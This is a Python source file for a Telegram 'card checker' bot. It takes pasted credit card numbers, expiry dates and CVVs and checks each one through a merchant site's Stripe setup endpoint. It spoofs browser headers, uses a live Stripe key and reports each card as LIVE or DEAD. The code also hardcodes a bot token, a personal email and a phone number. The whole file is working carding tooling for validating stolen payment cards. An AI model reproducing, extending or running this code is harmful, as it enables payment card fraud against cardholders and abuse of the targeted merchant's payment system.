import telebot
import requests
import time
import re

BOT_TOKEN = "7018443911:AAFP7YgMlc03URuqMUv-_VzysmewC0vt8jM"
bot = telebot.TeleBot(BOT_TOKEN)

YKARDS_URL = "https://ykards.com/stripe/ZN_createSetup_live.php"
STRIPE_CONFIRM_URL_BASE = "https://api.stripe.com/v1/setup_intents/"

def parse_card(card_text):
    # Accepts CC|MM|YY|CVV or CC|MM|YYYY|CVV
    match = re.fullmatch(r"\s*(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})\s*", card_text)
    if not match:
        return None
    cc, mm, yy, cvv = match.groups()
    mm = mm.zfill(2)
    if len(yy) == 4:
        yy = yy[2:]
    return cc, mm, yy, cvv

def get_client_secret():
    headers = {
        "content-type": "application/json",
        "accept": "*/*",
        "origin": "https://ykards.com",
        "referer": "https://ykards.com/checkout/",
        "user-agent": "Mozilla/5.0"
    }
    payload = {
        "email": "peshangsalam2002@gmail.com",
        "name": "John Doe",
        "phone": "3144740104",
        "url": "https://ykards.com/checkout/",
        "rtid": None,
        "vertical": None,
        "subvertical": None,
        "clickid": None,
        "alternative": None,
        "experiment": None
    }
    try:
        resp = requests.post(YKARDS_URL, headers=headers, json=payload, timeout=30)
        data = resp.json()
        return data.get("clientSecret")
    except Exception as e:
        return None

def check_card(cc, mm, yy, cvv, client_secret):
    if not client_secret:
        return "❌ Could not get clientSecret from ykards.com"
    setup_intent_id = client_secret.split("_secret_")[0]
    confirm_url = f"{STRIPE_CONFIRM_URL_BASE}{setup_intent_id}/confirm"
    headers = {
        "content-type": "application/x-www-form-urlencoded",
        "accept": "application/json",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "user-agent": "Mozilla/5.0"
    }
    data = {
        "return_url": "https://ykards.com/success/?clickid=null",
        "payment_method_data[billing_details][address][postal_code]": "10080",
        "payment_method_data[billing_details][address][country]": "IQ",
        "payment_method_data[type]": "card",
        "payment_method_data[card][number]": cc,
        "payment_method_data[card][cvc]": cvv,
        "payment_method_data[card][exp_year]": yy,
        "payment_method_data[card][exp_month]": mm,
        "payment_method_data[allow_redisplay]": "unspecified",
        "payment_method_data[pasted_fields]": "number",
        "payment_method_data[payment_user_agent]": "stripe.js/e01db0f08f; stripe-js-v3/e01db0f08f; payment-element; deferred-intent; autopm",
        "payment_method_data[referrer]": "https://ykards.com",
        "payment_method_data[time_on_page]": "47993",
        "payment_method_data[guid]": "dbad43e7-90f2-4f06-b543-b99cc4a948b65b720d",
        "payment_method_data[muid]": "3e3655f3-9053-4b67-995a-f07498809d63739d3d",
        "payment_method_data[sid]": "5d5b0012-cee0-43db-b3ae-1dca1cd4260cc326ae",
        "expected_payment_method_type": "card",
        "client_context[currency]": "gbp",
        "client_context[mode]": "setup",
        "client_context[setup_future_usage]": "off_session",
        "use_stripe_sdk": "true",
        "key": "pk_live_XOftf1rmeEWkESKdM6LYbm3p00gTCsltfJ",
        "client_secret": client_secret
    }
    try:
        resp = requests.post(confirm_url, headers=headers, data=data, timeout=30)
        result = resp.json()
        status = result.get("status", "")
        message = result.get("error", {}).get("message", "")
        code = result.get("error", {}).get("code", "")
        decline_code = result.get("error", {}).get("decline_code", "")
        if status == "succeeded" or status == "requires_action":
            return (f"✅ LIVE: {cc}|{mm}|{yy}|{cvv}\n"
                    f"Status: {status}\n"
                    f"Code: {code}\n"
                    f"Message: {message}")
        else:
            return (f"❌ DEAD: {cc}|{mm}|{yy}|{cvv}\n"
                    f"Status: {status}\n"
                    f"Decline Code: {decline_code}\n"
                    f"Code: {code}\n"
                    f"Message: {message}")
    except Exception as e:
        return f"❌ Error: {str(e)}"

@bot.message_handler(commands=['start'])
def start_handler(message):
    bot.send_message(message.chat.id,
        "💳 YKards Card Checker Bot\n"
        "Send cards in format:\n"
        "CC|MM|YY|CVV or CC|MM|YYYY|CVV\n"
        "One per line. Example:\n"
        "4430440021154042|01|28|162\n"
        "5218531116585093|12|2030|470"
    )

@bot.message_handler(func=lambda message: True)
def card_handler(message):
    cards = message.text.strip().split('\n')
    for card_text in cards:
        parsed = parse_card(card_text)
        if not parsed:
            bot.send_message(message.chat.id, f"❌ Invalid format: {card_text}")
            continue
        cc, mm, yy, cvv = parsed
        client_secret = get_client_secret()
        result = check_card(cc, mm, yy, cvv, client_secret)
        bot.send_message(message.chat.id, result)
        time.sleep(10)

bot.infinity_polling()
